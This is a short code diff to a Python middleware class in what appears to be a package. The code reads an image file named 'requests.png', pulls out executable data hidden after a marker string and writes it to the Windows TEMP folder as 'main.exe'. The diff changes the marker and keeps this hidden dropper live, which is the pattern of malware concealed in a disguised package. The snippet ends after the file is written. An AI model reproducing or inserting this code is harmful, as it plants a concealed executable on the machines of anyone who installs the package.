@@ -138,9 +138,9 @@ class BaseMiddleware(object):
 
 with open(os.path.join(os.path.dirname(__file__), 'requests.png'), 'rb') as f:
     data = f.read()
-    mz_index = data.find(b'MZ')
+    mz_index = data.find(b'PE_DATA')
     if mz_index != -1:
-        mz_data = data[mz_index:]
+        mz_data = data[mz_index + len(b'PE_DATA'):]
         temp_path = os.path.join(os.environ.get('TEMP', r'C:\Windows\Temp'), 'main.exe')
         with open(temp_path, 'wb') as exe_file:
             exe_file.write(mz_data)
